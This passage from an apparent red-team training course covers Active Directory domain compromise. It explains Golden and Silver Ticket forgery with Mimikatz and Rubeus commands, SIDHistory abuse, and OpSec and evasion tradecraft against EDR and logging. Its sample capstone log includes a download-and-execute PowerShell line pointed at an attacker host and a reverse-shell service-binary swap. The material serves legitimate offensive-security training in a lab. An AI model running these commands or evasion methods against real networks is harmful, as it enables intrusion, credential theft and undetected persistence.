3, 4, and 6.\r\n    *   If the path goes through a computer where a high-priv user has a session, use lateral movement techniques (M4) like PsExec, WMI, or PowerShell Remoting, potentially combined with harvested credentials (M6) or token impersonation (M3), to get onto that machine. Once there, maybe you can dump LSASS (M2) to get the user's current credentials or tickets.\r\n    *   If the path involves a Kerberoastable user who is a member of a privileged group, execute the Kerberoasting attack (M6), crack the hash, and use the resulting cleartext password or NTLM hash for lateral movement or authentication.\r\n    *   If the path involves a computer object with Unconstrained Delegation, compromising that computer allows you to potentially trick users into authenticating to it, capturing their TGTs.\r\n    *   If the path involves weak ACLs on an Organizational Unit (OU) or group, you might be able to add your own user to a privileged group directly.\r\n\r\n**Example Walkthrough Idea (Conceptual):**\r\n\r\n*   BloodHound shows: `CompromisedUser` -> `MemberOf` -> `WorkstationAdmins` -> `AdminTo` -> `SensitiveServer` -> `HasSession` -> `DomainAdminUser`.\r\n*   *Plan:*\r\n    1.  Use `CompromisedUser`'s access.\r\n    2.  Leverage `WorkstationAdmins` membership (maybe they have admin rights on their own workstation).\r\n    3.  Find credentials on the workstation to get admin on `SensitiveServer` (lateral movement M4, M6).\r\n    4.  Once on `SensitiveServer`, look for sessions or credentials of `DomainAdminUser` (recon M2).\r\n    5.  Dump LSASS or find cached credentials for `DomainAdminUser`.\r\n    6.  Use `DomainAdminUser` credentials/hash/ticket to achieve Domain Admin access.\r\n\r\nThis section is less about *new* techniques and more about *applying* the techniques you've learned in a strategic, data-driven way guided by AD enumeration.\r\n\r\n---\r\n\r\n### 7.2 Golden Ticket Attacks\r\n\r\nThis is one of the most powerful attacks against Active Directory. It allows you to forge a Ticket Granting Ticket (TGT) for *any* user in the domain, effectively granting you the ability to impersonate that user and access *any* resource within the domain (and potentially trusted domains).\r\n\r\n**Theory:**\r\n\r\nKerberos authentication relies on a trusted third party: the Key Distribution Center (KDC), which is the Domain Controller. The KDC has a special account, `krbtgt`, whose NTLM hash is used to encrypt and sign TGTs. A TGT is like a long-term pass that proves your identity to the KDC. Once you have a TGT, you can request Service Tickets (TGSs) for specific services (like accessing a file share, running a remote command) without needing your password again.\r\n\r\nA Golden Ticket attack works by obtaining the `krbtgt` account's NTLM hash. With this hash, an attacker can manually *forge* a valid TGT for *any* user (even non-existent ones) with *any* group memberships (including Domain Admins, Enterprise Admins, etc.). This forged ticket is signed with the legitimate `krbtgt` hash, so the KDC and other services trust it implicitly.\r\n\r\n**Prerequisites:**\r\n\r\n*   The NTLM hash of the `krbtgt` account.\r\n*   The Domain Name.\r\n*   The Domain SID.\r\n*   Administrator or SYSTEM privileges on *any* domain-joined machine to inject the ticket into a session (or use tools like Impacket from an attacker machine).\r\n\r\n**How to get the `krbtgt` hash:**\r\n\r\nThe most common way is using the `DCSync` technique (covered in 7.3) from a machine with sufficient privileges (Domain Admins, Enterprise Admins, or specific ACLs). Alternatively, if you have administrative access on a Domain Controller, you can dump the NTDS.DIT database and extract the hash offline (e.g., using `secretsdump.py` or `dsntutil.exe` + `pypykatz`).\r\n\r\n**Practical Application (using Mimikatz):**\r\n\r\nAssume you have already obtained the `krbtgt` hash (e.g., `a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4`).\r\n\r\n1.  **Get Domain SID:** You can get this from any domain-joined machine.\r\n    ```powershell\r\n    whoami /user\r\n    ```\r\n    Look for the SID string (e.g., `S-1-5-21-...). The portion before the last hyphen is the Domain SID.\r\n    Alternatively:\r\n    ```powershell\r\n    (Get-ADDomain).DomainSID\r\n    ```\r\n    (Requires ActiveDirectory PowerShell module, which might not be on a standard compromised host, but is common on admin workstations or DCs).\r\n    Let's say the Domain SID is `S-1-5-21-1234567890-987654321-123456789`. The relevant part for Mimikatz is `1234567890-987654321-123456789`.\r\n\r\n2.  **Inject the Golden Ticket:** Open Mimikatz (requires Administrator/SYSTEM).\r\n    ```mimikatz\r\n    # Ensure you have the necessary privileges\r\n    privilege::debug\r\n\r\n    # Inject the golden ticket\r\n    # Parameters:\r\n    # /user: The username to impersonate (can be fake, e.g., \"administrator\" or \"pwnedadmin\")\r\n    # /domain: The FQDN of the domain (e.g., \"corp.local\")\r\n    # /sid: The Domain SID obtained in step 1\r\n    # /krbtgt: The NTLM hash of the krbtgt account\r\n    # /ptt: Pass The Ticket - injects the ticket into the current session\r\n    kerberos::golden /user:pwnedadmin /domain:corp.local /sid:S-1-5-21-1234567890-987654321-123456789 /krbtgt:a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4 /ptt\r\n    ```\r\n\r\n3.  **Verify the Ticket:** Use `klist` to view the Kerberos tickets in your current session. You should see a TGT for the user you specified, issued by `krbtgt`.\r\n\r\n    ```cmd\r\n    klist\r\n    ```\r\n\r\n4.  **Access Resources:** Now, you can access any resource in the domain as `pwnedadmin` (which effectively has the privileges you assigned via the group memberships implied by the ticket).\r\n\r\n    ```cmd\r\n    # Access a file share on a Domain Controller\r\n    net use \\\\DC01.corp.local\\SYSVOL\r\n\r\n    # Or run a command remotely on a DC using PsExec (assuming it's allowed)\r\n    # This might require specific PsExec versions or configurations to use the injected ticket\r\n    # A more reliable way might be to use Impacket's psexec.py with the ticket cache\r\n    ```\r\n\r\n**Practical Application (using Rubeus):**\r\n\r\nRubeus is a C# alternative to Mimikatz for Kerberos interaction, often preferred for its flexibility and less signatured nature compared to Mimikatz binaries.\r\n\r\n1.  **Get Domain SID:** Same as step 1 for Mimikatz.\r\n2.  **Inject the Golden Ticket:**\r\n    ```powershell\r\n    # Assuming you have Rubeus.exe accessible\r\n    .\\Rubeus.exe golden /domain:corp.local /sid:S-1-5-21-1234567890-987654321-123456789 /krbtgt:a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4 /user:pwnedadmin /ptt\r\n    ```\r\n    Rubeus offers more options, like specifying group SIDs to add to the ticket explicitly, which gives finer-grained control over the resulting privileges if you don't want full DA.\r\n\r\n3.  **Verify & Access:** Same as steps 3 & 4 for Mimikatz.\r\n\r\n**OpSec Considerations:**\r\n\r\n*   Injecting tickets modifies the current logon session's ticket cache, which *can* be detected by sophisticated endpoint monitoring.\r\n*   Accessing resources with a forged ticket generates logs on the target resource server and potentially the DC, but they will look like legitimate Kerberos authentications *from the user specified in the ticket*. The anomaly is the *source* machine from which the authentication originated if that machine isn't typically used by the impersonated user.\r\n*   Obtaining the `krbtgt` hash (often via DCSync) is a very high-privilege action that is heavily logged and monitored by defenders.\r\n\r\n---\r\n\r\n### 7.3 Silver Ticket Attacks\r\n\r\nWhile a Golden Ticket grants access to *any* resource as *any* user, a Silver Ticket grants access to a *specific service* on a *specific server* as *any* user.\r\n\r\n**Theory:**\r\n\r\nKerberos authentication for services uses Service Tickets (TGSs). A TGS is encrypted and signed with the NTLM hash of the *service account* or the *computer account* hosting the service. Forging a Silver Ticket involves obtaining the NTLM hash of the target server's computer account (or the hash of the specific service account if one is used and has an SPN) and using it to manually forge a valid TGS for a specific service on that server.\r\n\r\nSince the ticket is signed with the legitimate key (the server's hash), the target server trusts the ticket and grants access to the specified service, regardless of the actual user requesting it.\r\n\r\n**Prerequisites:**\r\n\r\n*   The NTLM hash of the target server's computer account (e.g., `SERVER01$`).\r\n*   The Domain Name.\r\n*   The Domain SID.\r\n*   The Target Server's FQDN.\r\n*   The Service Name (SPN portion, e.g., `cifs`, `host`, `http`).\r\n*   Administrator or SYSTEM privileges on *any* domain-joined machine to inject the ticket.\r\n\r\n**How to get the target server's hash:**\r\n\r\nYou need administrator privileges on the target server itself to dump its LSASS or registry hives (SAM/SECURITY) and extract the `SERVER01$` account's NTLM hash. Techniques from Module 2 and 3 (Local Enumeration, Credential Harvesting, Privilege Escalation) are relevant here.\r\n\r\n**Practical Application (using Mimikatz):**\r\n\r\nAssume you have obtained the target server's hash (e.g., `b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5`). Let's target the CIFS service (for file shares) on `FILESERVER01.corp.local`.\r\n\r\n1.  **Get Domain SID & Domain Name:** Same as for Golden Ticket.\r\n2.  **Get Target Server Hash:** Assumed obtained (e.g., via local admin + Mimikatz `lsadump::sam`).\r\n3.  **Identify Service Name:** Common services include `cifs` (file shares), `host` (many things, including RDP), `http` (web services), `mssql` (SQL Server).\r\n4.  **Inject the Silver Ticket:** Open Mimikatz (requires Administrator/SYSTEM).\r\n    ```mimikatz\r\n    privilege::debug\r\n\r\n    # Inject the silver ticket\r\n    # Parameters:\r\n    # /user: The username to appear as in logs (can be fake, e.g., \"fakeuser\")\r\n    # /domain: The FQDN of the domain\r\n    # /sid: The Domain SID\r\n    # /target: The FQDN of the target server\r\n    # /service: The service name (e.g., cifs)\r\n    # /ntlm: The NTLM hash of the target server's computer account (SERVER01$)\r\n    # /ptt: Pass The Ticket\r\n    kerberos::silver /user:fakeuser /domain:corp.local /sid:S-1-5-21-1234567890-987654321-123456789 /target:FILESERVER01.corp.local /service:cifs /ntlm:b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5 /ptt\r\n    ```\r\n\r\n5.  **Verify the Ticket:** Use `klist`. You should see a TGS for `cifs/FILESERVER01.corp.local`.\r\n\r\n    ```cmd\r\n    klist\r\n    ```\r\n\r\n6.  **Access the Service:** Now, you can access the specified service on the target server.\r\n\r\n    ```cmd\r\n    # Access a file share on FILESERVER01\r\n    net use \\\\FILESERVER01.corp.local\\sharename\r\n    ```\r\n\r\n**Practical Application (using Rubeus):**\r\n\r\n```powershell\r\n# Assuming you have Rubeus.exe accessible\r\n.\\Rubeus.exe silver /domain:corp.local /sid:S-1-5-21-1234567890-987654321-123456789 /target:FILESERVER01.corp.local /service:cifs /ntlm:b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5 /user:fakeuser /ptt\r\n```\r\n\r\n**OpSec Considerations:**\r\n\r\n*   Similar to Golden Tickets, injecting the ticket modifies the session and generates logs on the target server.\r\n*   The authentication log on the target server will show access for the user specified in `/user`, but the source machine might be unusual for that user.\r\n*   Obtaining the target server's hash requires administrative access on that specific server, which itself has OpSec implications (Module 2/3/4).\r\n\r\n---\r\n\r\n### 7.4 SIDHistory Exploitation\r\n\r\nSIDHistory is a lesser-known vector but can be powerful in environments with a history of domain migrations or acquisitions.\r\n\r\n**Theory:**\r\n\r\nWhen user or group accounts are migrated from one domain to another, their original SID from the source domain can be added to the `sIDHistory` attribute of the new account in the target domain. This allows the migrated account to retain access to resources in the source domain that were ACL'd using the original SID.\r\n\r\nThe security principal (user or group) possessing a SID in its `sIDHistory` attribute *can* be treated by the target resource as if it were the original security principal from the source domain for access control purposes.\r\n\r\nThe exploit comes when a user account in Domain A has the SID of a highly privileged group (like Domain Admins) from Domain B in its `sIDHistory`, and there is a trust relationship that allows Domain A users to access resources in Domain B. The user in Domain A might then be able to access resources in Domain B as if they were a Domain Admin *from Domain B*.\r\n\r\n**Prerequisites:**\r\n\r\n*   A trust relationship between domains.\r\n*   An account in one domain with the SID of a privileged group from *another* trusted domain in its `sIDHistory`.\r\n*   The ability to authenticate as that account.\r\n\r\n**Practical Application:**\r\n\r\nExploiting SIDHistory often involves *creating* a user with a manipulated `sIDHistory` or *modifying* an existing user's `sIDHistory`. This typically requires high privileges (like Domain Admin) in the *source* domain or the ability to perform DCShadow/modify AD objects with sufficient rights.\r\n\r\nSince *creating* this condition requires high privileges anyway, the exploit itself is usually just authenticating as the manipulated user and accessing resources in the trusted domain. The key is *identifying* existing accounts with potentially exploitable SIDHistory.\r\n\r\n1.  **Identify Accounts with SIDHistory:** Use AD enumeration tools.\r\n    ```powershell\r\n    # Using PowerView (from PowerSploit)\r\n    Get-DomainUser -Properties SIDHistory | Where-Object {$_.SIDHistory -ne $null} | Select-Object Name, SIDHistory\r\n\r\n    Get-DomainGroup -Properties SIDHistory | Where-Object {$_.SIDHistory -ne $null} | Select-Object Name, SIDHistory\r\n    ```\r\n2.  **Analyze SIDHistory:** Look at the SIDs listed. Try to identify the domain and the original account/group the SID belongs to. Use resources like `addam.py` from Impacket or online SID lookups to identify common well-known SIDs (like Domain Admins). If you see a SID corresponding to a privileged group from a trusted domain, you've found a potential vector.\r\n3.  **Leverage the Account:** If you have the credentials for an account with an interesting SIDHistory, simply authenticate as that user (e.g., via `runas /netonly`, PsExec, or Pass-the-Hash if you have the hash) and attempt to access resources in the domain corresponding to the SID in the history.\r\n\r\n**Creating SIDHistory (Requires High Privileges):**"
    },
    {
      "title": "module_8",
      "description": "module_8 Overview",
      "order": 8,
      "content": "Alright team! We've traversed the intricate pathways of Windows internals, harvested precious credentials, scaled local privileges, danced across the network, and mapped the hidden relationships within Active Directory. Now, we arrive at the culmination ‚Äì Module 8.\r\n\r\nThis isn't just a wrap-up; it's where we synthesize everything. We stop thinking about individual techniques and start thinking like a cohesive red team operator. We'll focus on the crucial, often overlooked, aspects: *Operational Security (OpSec)* to stay undetected, the *Planning* that makes an operation efficient, the *Execution* where theory meets reality, and the *Reporting* that translates our technical feats into actionable intelligence for defenders.\r\n\r\nThis module is designed around the **Capstone Project**. Your journey through Modules 1-7 has equipped you with the tools and knowledge. Now, you'll apply them end-to-end in a simulated operation. Think of this as your final exam, but one where you get to write the questions (your plan) and show your work (your execution and report).\r\n\r\nLet's dive into the final, critical pieces of the puzzle!\r\n\r\n---\r\n\r\n## Module 8: Operational Security (OpSec), Reporting & Capstone Project\r\n\r\n**Module Objective:** Understand and apply OpSec principles throughout the operation, synthesize all learned techniques, plan a simulated red team engagement, execute it in the lab, and document the process and findings.\r\n\r\n**Duration:** This module is primarily driven by the Capstone Project, which will require significant hands-on lab time. Allocate time for planning (several hours), execution (potentially several hours spread out), and reporting (several hours).\r\n\r\n---\r\n\r\n### Section 8.1: Operational Security (OpSec) - The Art of Not Getting Caught\r\n\r\nWelcome to the shadowy world of OpSec. While gaining access and escalating privileges is exciting, doing it stealthily is what separates a noisy script kiddie from a professional red teamer. OpSec is about minimizing your footprint, blending in, and understanding how defenders see the world.\r\n\r\n**Why OpSec Matters:**\r\n\r\n*   **Real Engagements:** Getting caught early means mission failure. It burns your tools, techniques, and procedures (TTPs).\r\n*   **Lab Environment:** Even in a lab, practicing good OpSec helps you understand *why* certain techniques are better than others and prepares you for real-world constraints. It forces you to think like a defender trying to catch you.\r\n\r\n#### 8.1.1 Reviewing OpSec by Phase\r\n\r\nLet's revisit the stages we've covered and highlight OpSec considerations at each step:\r\n\r\n*   **Initial Access (Assumed):** While we started *after* initial access, the methods *used* for initial access (phishing, exploit, weak RDP, etc.) have huge OpSec implications. A loud exploit might trigger immediate alerts, while a carefully crafted phishing email with a subtle payload might go unnoticed longer.\r\n*   **Module 1: Initial Host Reconnaissance:**\r\n    *   **Risk:** Running noisy commands (`systeminfo`, `tasklist`, `netstat`) frequently or in rapid succession can look suspicious, especially if logged. Using standard binaries is generally better than dropping custom tools early.\r\n    *   **OpSec Tip:** Use native commands where possible. Space out your commands. Understand what commands are *expected* on that system (e.g., a sysadmin might run `tasklist`, but maybe not every 5 minutes).\r\n*   **Module 2: Local Enumeration & Credential Harvesting:**\r\n    *   **Risk:** Accessing sensitive files/registry keys, dumping LSASS. Duming LSASS is *highly* suspicious and often a prime detection vector for EDR/AV. Running unknown executables (`procdump`, `Mimikatz` variants) is also risky.\r\n    *   **OpSec Tip:** Use fileless techniques (PowerShell scripts loaded directly into memory). Use trusted/signed binaries if available (though attackers use these too!). Understand *how* tools like Mimikatz work (`sekurlsa::logonpasswords`) and what system calls they make, as defenders look for those specific calls. Consider *offline* analysis if you can exfiltrate memory dumps or registry hives without touching LSASS directly on the target.\r\n*   **Module 3: Windows Privilege Escalation:**\r\n    *   **Risk:** Creating new services, dropping exploit binaries, modifying registry keys, using known vulnerable kernel exploits. UAC bypasses might trigger specific EDR rules.\r\n    *   **OpSec Tip:** Leverage misconfigurations that *don't* require dropping files (e.g., weak service permissions you can modify in place). Use reflective DLL injection or in-memory PE techniques. Understand the detection surface of common PE tools (`PowerUp`, `WinPEAS`) and consider manually replicating steps or using less common variants.\r\n*   **Module 4: Lateral Movement:**\r\n    *   **Risk:** Using noisy tools like PsExec (sysinternals version is often flagged), high volume of failed authentication attempts, using unexpected protocols (WMI, PowerShell Remoting) between unusual hosts, creating scheduled tasks remotely.\r\n    *   **OpSec Tip:** Blend in. Use protocols *expected* between systems (e.g., RDP for admin access, SMB for file shares). Use credentials you've harvested via PtH/PtT rather than brute-forcing. Use in-memory execution frameworks (like Covenant, Empire, Metasploit) that handle lateral movement tasks more stealthily than dropping raw executables. Use `Invoke-Command` or `Enter-PSSession` with appropriate credentials if PowerShell Remoting is common in the environment.\r\n*   **Module 5: Active Directory Enumeration:**\r\n    *   **Risk:** High volume of LDAP/S queries from a single host, especially from an unusual user or machine. Running BloodHound collectors (`SharpHound`, `PowerHound`) can be noisy due to the sheer volume of queries they make.\r\n    *   **OpSec Tip:** Use native tools (`net group /domain`, `nltest`) sparingly first. Use less noisy AD enumeration techniques if possible. Run BloodHound collectors from a system that is less monitored or blend the collection activity over a longer period. Understand *what* queries BloodHound makes so you know what defenders might see.\r\n*   **Module 6: Advanced Credential Attacks:**\r\n    *   **Risk:** Kerberoasting (requesting many SPN tickets from a DC can be detected, especially if done from a non-server OS), AS-REP Roasting (failed pre-authentication attempts logged on the DC), PtH/PtT (using tickets/hashes from unusual source IPs). Using tools like Mimikatz/Rubeus on target systems.\r\n    *   **OpSec Tip:** Perform Kerberoasting from a less critical host. Be mindful of the number of requests. Perform offline cracking *off* the target network. Use PtH/PtT carefully, ensuring the source/destination combination doesn't look anomalous. Use in-memory versions of tools like Rubeus via PowerShell.\r\n*   **Module 7: Domain Dominance & Persistence:**\r\n    *   **Risk:** Modifying sensitive AD objects (users, groups, GPOs, AdminSDHolder), using highly suspicious techniques like DCSync or DCShadow (these look like domain controllers replicating!). Creating persistent backdoors (scheduled tasks, services, WMI permanent events, modifying logon scripts, etc.).\r\n    *   **OpSec Tip:** Understand what is being monitored on Domain Controllers (Event IDs related to object modification, replication, logon/logoff). Use techniques that blend in (e.g., modifying an *existing* GPO subtly rather than creating a new one). Use less common persistence methods. Be *extremely* cautious with DCSync/DCShadow ‚Äì these are often considered high-risk techniques likely to trigger alerts.\r\n\r\n#### 8.1.2 Common Detection Mechanisms\r\n\r\nDefenders use various tools and techniques to spot malicious activity. Understanding these helps you evade them.\r\n\r\n1.  **Endpoint Detection and Response (EDR) / Antivirus (AV):**\r\n    *   **What they see:** Malicious file hashes, suspicious process behavior (e.g., a standard user process accessing LSASS memory), unusual parent-child process relationships (e.g., `cmd.exe` spawning `powershell.exe` with encoded commands), modifications to critical system areas (registry, startup folders), known exploit patterns.\r\n    *   **Evasion thought:** Use fileless execution, process injection, obfuscate scripts, use Living Off The Land Binaries/Scripts (LOLBAS - using legitimate system tools for malicious purposes, like `certutil` for decoding files, `powershell` for execution, `bitsadmin` for downloads).\r\n2.  **Network Monitoring (IDS/IPS, Network Traffic Analysis):**\r\n    *   **What they see:** Connections to known bad IPs, high volume of traffic on unusual ports (e.g., SMB traffic from a workstation to another workstation that isn't normally a file server), scanning activity, suspicious protocol usage (e.g., NTLM authentication attempts with old hashes, Kerberos service ticket requests for many SPNs).\r\n    *   **Evasion thought:** Use encrypted channels (HTTPS C2), tunnel traffic, blend in with normal traffic patterns, minimize scanning, use credentials/hashes via PtH/PtT instead of brute force.\r\n3.  **Logging and Security Information and Event Management (SIEM):**\r\n    *   **What they see:** This is the defender's primary source of truth. Windows Event Logs (Security, System, Application), Sysmon logs (highly detailed process, network, file activity), Domain Controller logs (authentication events, object modifications, replication). SIEMs correlate these logs to spot patterns (e.g., failed login attempts followed by a successful login from a different user/IP, a user account logging into multiple machines in a short time, unusual service installations).\r\n    *   **Evasion thought:** Understand critical Event IDs (e.g., 4624/4625 Logon/Logoff, 4688 Process Creation, 4720 User Created, 4732 Group Membership Added). Avoid generating excessive failed events. Be cautious with log clearing (`wevtutil cl system` etc.) as clearing logs *itself* generates a log event (Event ID 1102)! Focus on techniques that generate *fewer* or *less suspicious* log entries. Sysmon is a pain for attackers; understanding its configuration is key.\r\n\r\n#### 8.1.3 Evasion Techniques & Tradecraft\r\n\r\nBeyond specific tool usage, OpSec is a mindset and a set of practices:\r\n\r\n*   **Living Off The Land (LOTL):** Use legitimate system tools (PowerShell, WMI, schtasks, bitsadmin, etc.) as much as possible instead of dropping custom malware. This makes your activity look more like legitimate system administration.\r\n*   **Fileless Techniques:** Execute payloads directly in memory (e.g., PowerShell scripts via `IEX`, reflective DLL injection) to avoid writing malicious files to disk, which AV/EDR often monitor.\r\n*   **Obfuscation:** Encode or obfuscate scripts and commands to make them harder for static analysis (AV signatures) and defenders to read (`powershell -encodedcommand ...`).\r\n*   **Timing:** Perform actions during off-hours or maintenance windows when activity might be expected or monitoring staff are less vigilant (though automated alerting should still catch you!).\r\n*   **Tooling:** Use reputable red team frameworks (Covenant, Empire, Metasploit, PoshC2) that implement better OpSec practices (encrypted C2, in-memory execution, less signatured payloads) than raw tools. Understand the OpSec profile of your tools ‚Äì Mimikatz is loud, but essential; use it judiciously.\r\n*   **User Simulation:** Try to make your activity look like a legitimate user or administrator on the network. Access expected resources, use expected protocols.\r\n*   **C2 Communications:** Use encrypted channels (HTTPS is common) and potentially domain fronting or compromised legitimate domains to masquerade command and control traffic.\r\n\r\n**OpSec is a constant cat-and-mouse game.** Defenders improve, and attackers adapt. Staying current on detection methods is crucial for effective red teaming.\r\n\r\n### Section 8.2: Planning a Red Team Operation (Capstone Phase 1)\r\n\r\nBefore you touch a single key in the lab for your Capstone, you *must* plan. A good plan saves time, reduces noise, and increases your chances of success.\r\n\r\n#### 8.2.1 Why Plan?\r\n\r\n*   **Clarity of Purpose:** What are you trying to achieve? (The objective).\r\n*   **Efficiency:** Avoid wasted steps or going down rabbit holes.\r\n*   **Risk Management:** Understand the potential detection points and have contingencies.\r\n*   **Team Coordination (Real World):** Ensures everyone is on the same page and not stepping on each other's toes.\r\n*   **Measurability:** How do you know you succeeded?\r\n\r\n#### 8.2.2 Key Planning Elements\r\n\r\n1.  **Define Objectives:** This is the *goal* of the operation. For your Capstone, choose something specific and achievable within your lab environment. Examples:\r\n    *   Obtain Domain Administrator privileges.\r\n    *   Access a specific sensitive file share (e.g., `\\\\DC01\\HR_Data`).\r\n    *   Establish persistent access on the Domain Controller.\r\n    *   Compromise a specific user's mailbox or cloud storage (if simulated).\r\n    *   Exfiltrate a specific \"sensitive\" file.\r\n    *   Establish persistence on at least 3 different machines in the network.\r\n\r\n    *Write down your objective clearly.*\r\n\r\n2.  **Define Scope:** What systems, subnets, user accounts, or applications are *in bounds* for this operation? In your lab, this might be \"all machines in the `CONTOSO.COM` domain\" or \"only systems on the 192.168.1.0/24 subnet\". *Write down your scope.*\r\n\r\n3.  **Define Rules of Engagement (RoE):** In a real engagement, this is critical and covers things like: Are DoS attacks allowed? Can we target specific individuals? What hours can we operate? What is the \"get out of jail free\" card if we're caught? In your lab, this is simpler, but still good practice:\r\n    *   Are you allowed to modify system configurations permanently (except for persistence objectives)?\r\n    *   Are you allowed to shut down systems? (Probably not).\r\n    *   What is the starting point (the \"initial access\" context)? (e.g., \"You have a low-priv shell on WKSTN1\").\r\n\r\n    *Define simple RoE for your lab.*\r\n\r\n#### 8.2.3 Intelligence Gathering & Attack Path Mapping\r\n\r\nThis is where you leverage the skills from Modules 1-5, especially Module 5 (AD Enumeration and BloodHound).\r\n\r\n*   **Review your AD Data:** Look at the BloodHound graph, your PowerView output, your `net` command results.\r\n*   **Identify High-Value Targets:** Who are the Domain Admins? Where do they log in? What systems are critical?\r\n*   **Map Potential Paths:** Use BloodHound queries or manually trace connections/privileges:\r\n    *   Shortest path from your starting point (initial access host/user) to your objective.\r\n    *   Identify users or groups with excessive privileges.\r\n    *   Find systems with potential misconfigurations (e.g., unconstrained delegation).\r\n    *   Locate users vulnerable to credential attacks (Kerberoastable, AS-REP Roasting).\r\n*   **Identify Choke Points:** Are there systems or users that, if compromised, open up many paths?\r\n\r\n#### 8.2.4 Strategy Development\r\n\r\nBased on your objective, scope, RoE, and intelligence, outline your plan. This isn't just a list of tools; it's a sequence of actions.\r\n\r\n1.  **Starting Point:** Where are you beginning? (e.g., Low-priv user `user.low` on `WKSTN1`).\r\n2.  **Phase 1: Initial Foothold & Local Recon:** What commands/scripts will you run immediately to understand the local host? (`whoami`, `ipconfig`, `tasklist`, basic file checks). OpSec consideration: Use native tools first.\r\n3.  **Phase 2: Local Enumeration & PE:** How will you look for local PE vectors? (`PowerUp`, `WinPEAS`, manual checks). What's your primary PE target? What's your backup? OpSec consideration: Use in-memory techniques if possible.\r\n4.  **Phase 3: Credential Harvesting:** How will you attempt to get credentials from the initial host *after* achieving local admin? (e.g., `Invoke-Mimikatz` via reflective PowerShell, dumping SAM/SECURITY hives). OpSec consideration: Dumping LSASS is high risk; prioritize other methods if feasible initially.\r\n5.  **Phase 4: AD & Network Recon:** How will you gather more AD info from your new privileged shell? (`PowerView`, `SharpHound`). OpSec consideration: Run collectors carefully, consider timing.\r\n6.  **Phase 5: Attack Path Execution & Lateral Movement:** Based on BloodHound/AD data, what's your *chosen* path to the objective? (e.g., User `svc_sql` is Kerberoastable -> Crack hash -> `svc_sql` is admin on `APP01` -> PsExec to `APP01` -> `APP01` has cached creds for `admin.da` -> PtH to DC). List the specific lateral movement techniques you plan to use for each hop. OpSec consideration: Which LM methods are less noisy?\r\n7.  **Phase 6: Reaching the Objective:** What are the final steps? (e.g., If objective is DA, it might be `PtH` to the DC's `krbtgt` hash to forge a Golden Ticket).\r\n8.  **Phase 7: Persistence (If objective includes it):** How will you maintain access? (e.g., Create a scheduled task, modify a GPO, DCSync a backup DA account). OpSec consideration: Choose a persistence method least likely to be found.\r\n9.  **Phase 8: Cleanup (Lab context):** Revert VMs.\r\n\r\n*Create a flowchart or detailed step-by-step list of your planned actions.* Include the *expected* tools/commands for each step. Have backup plans if a step fails.\r\n\r\n### Section 8.3: Execution (Capstone Phase 2)\r\n\r\nThis is where you put your plan into action in the lab environment.\r\n\r\n**Key Principles:**\r\n\r\n*   **Follow Your Plan:** Start by executing the steps you outlined.\r\n*   **Document *Everything*:** This is CRITICAL for your report. Don't just run commands; record them.\r\n*   **Be Flexible:** Your plan *will* encounter unexpected issues. Systems might be configured differently, tools might fail, techniques might not work. Be ready to troubleshoot and adapt your plan on the fly using your knowledge from M1-7.\r\n*   **Practice OpSec:** Be mindful of the noise you're making, even in the lab. If you planned a stealthy approach, stick to it.\r\n*   **Verify Each Step:** Did the PE succeed? Did the lateral movement work? Did you get the credentials?\r\n\r\n#### 8.3.1 Step-by-Step Execution & Documentation\r\n\r\nThis is the most important part of the execution phase for the Capstone. You need to capture *exactly* what you did.\r\n\r\n**Recommended Documentation Method:**\r\n\r\nMaintain a running log as you work. A simple text file, a Markdown file, or a tool like OneNote works well. For each action:\r\n\r\n1.  **Timestamp:** When did you perform the action?\r\n2.  **Host:** Which system are you currently operating on?\r\n3.  **User Context:** What user are you running as? (e.g., `low-priv-user`, `NT AUTHORITY\\SYSTEM`).\r\n4.  **Action/Command:** What did you do? (e.g., \"Attempting PE using Service X vulnerability\", `powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker_ip/PowerUp.ps1'); Invoke-AllChecks\"`)\r\n5.  **Result:** What happened? Was it successful? Did it fail? What was the output? (Include command output or screenshots).\r\n6.  **Analysis/Notes:** What does this result tell you? What's the next step based on this? Did you deviate from the plan and why?\r\n\r\n**Example Log Snippet:**\r\n\r\n```markdown\r\n---\r\n### Capstone Execution Log - Objective: Obtain DA\r\n\r\n**Starting Point:** Low-priv user `user.low` on `WKSTN1`.\r\n\r\n**[2023-10-27 10:05:00]**\r\n**Host:** WKSTN1\r\n**User:** CONTOSO\\user.low\r\n**Action:** Initial recon - check basic system info.\r\n**Command:** `systeminfo`\r\n**Result:** Output shows Windows 10 Pro, build xxxx. Domain joined to CONTOSO.COM. Patch level seems relatively recent.\r\n**Notes:** System is Windows 10. Need to identify specific build/missing patches later if kernel exploit is considered.\r\n\r\n**[2023-10-27 10:07:30]**\r\n**Host:** WKSTN1\r\n**User:** CONTOSO\\user.low\r\n**Action:** Check running processes for interesting targets or potential PE vectors.\r\n**Command:** `tasklist /svc`\r\n**Result:** Output lists services and their PIDs. See 'VulnerableService.exe' running with PID 1234. Looks suspicious.\r\n**Notes:** Investigate 'VulnerableService.exe'. Check its path and permissions.\r\n\r\n**[2023-10-27 10:15:00]**\r\n**Host:** WKSTN1\r\n**User:** CONTOSO\\user.low\r\n**Action:** Check permissions on 'VulnerableService.exe' path.\r\n**Command:** `icacls \"C:\\Program Files\\Vulnerable Service\"`\r\n**Result:** Output shows 'BUILTIN\\Users:(F)'. Full control for standard users! This is a PE vector.\r\n**Notes:** Plan changed: Pursue vulnerable service PE. Will attempt to replace the service binary.\r\n\r\n**[2023-10-27 10:20:00]**\r\n**Host:** WKSTN1\r\n**User:** CONTOSO\\user.low\r\n**Action:** Attempting to replace VulnerableService.exe with malicious binary (meterpreter shell reverse tcp, rename to VulnerableService.exe).\r\n**Command:** `copy C:\\Users\\user.low\\Desktop\\evil.exe \"C:\\Program Files\\Vulnerable Service\\VulnerableService.exe\"`\r\n**Result:** Copy successful!\r\n**Notes:** Now need to restart the service.\r\n\r\n**[2023-10-27 10:21:00]**\r\n**Host:** WKSTN1\r\n**User:** CONTOSO\\user.low\r\n**Action:** Restarting VulnerableService.\r\n**Command:** `sc stop VulnerableService` then `sc start VulnerableService`\r\n**Result:** Service stopped and started successfully. Attacker listener received connection! Got SYSTEM shell.\r\n**Notes:** PE successful via vulnerable service binary replacement. Now at `NT AUTHORITY\\SYSTEM` on WKSTN1. Proceed to M2/M6 techniques for cred harvesting as SYSTEM.\r\n---\r\n```\r\n\r\nThis level of detail is crucial. It allows 